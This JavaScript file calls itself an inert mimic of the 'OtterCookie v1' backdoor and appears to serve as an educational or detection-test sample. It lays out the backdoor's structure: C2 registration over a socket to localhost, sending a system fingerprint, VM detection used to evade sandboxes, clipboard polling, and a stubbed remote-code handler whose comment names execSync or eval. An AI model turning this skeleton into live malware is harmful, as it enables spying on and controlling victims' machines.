// [FAKE-DEMO] This is an INERT educational sample — NOT real malware
// Mimics OtterCookie v1 JavaScript backdoor structure
// All C2 addresses point to 127.0.0.1, all actions are console.log only

const io = require('socket.io-client');
const os = require('os');
const { execSync } = require('child_process');
const clipboardy = require('clipboardy');

const C2_SERVER = 'ws://127.0.0.1:9999';
const socket = io.connect(C2_SERVER);

// [FAKE-DEMO] VM/Sandbox detection — checks but does nothing
function detectVM() {
  const cpus = os.cpus();
  const model = cpus[0]?.model || '';
  const vmIndicators = ['qemu', 'virtualbox', 'vmware', 'parallels', 'xen'];
  for (const indicator of vmIndicators) {
    if (model.toLowerCase().includes(indicator)) {
      console.log('[FAKE-DEMO] VM detected:', indicator);
      return true;
    }
  }
  return false;
}

// [FAKE-DEMO] Command handler — only logs, never executes
function handleCode(code) {
  console.log('[FAKE-DEMO] Would execute remote code:', code?.substring(0, 50));
  // In real OtterCookie: execSync(code) or eval(code)
}

// [FAKE-DEMO] System fingerprinting
function getFingerprint() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    arch: os.arch(),
    user: os.userInfo().username,
  };
}

// [FAKE-DEMO] Clipboard watcher — reads but only logs locally
function watchClipboard() {
  setInterval(() => {
    try {
      const text = clipboardy.readSync();
      if (text && text.length > 0) {
        console.log('[FAKE-DEMO] Clipboard content:', text.substring(0, 30));
      }
    } catch (e) { /* ignore */ }
  }, 5000);
}

// [FAKE-DEMO] File scanner — lists filenames but never reads content
function scanDir(dir, extensions) {
  const excludeFolders = ['node_modules', '.git', 'vendor', 'Library'];
  console.log('[FAKE-DEMO] Would scan directory:', dir);
  console.log('[FAKE-DEMO] Looking for extensions:', extensions);
  console.log('[FAKE-DEMO] Excluding folders:', excludeFolders);
}

// [FAKE-DEMO] Main backdoor loop
socket.on('connect', () => {
  console.log('[FAKE-DEMO] Connected to C2 (localhost only)');
  const fp = getFingerprint();
  socket.emit('register', fp);
});

socket.on('command', (data) => handleCode(data));
socket.on('whour', () => socket.emit('info', getFingerprint()));
socket.on('upload', (data) => scanDir(data.dir, data.extensions));

if (!detectVM()) {
  watchClipboard();
}

console.log('[FAKE-DEMO] OtterCookie v1 sample loaded — this is NOT real malware');
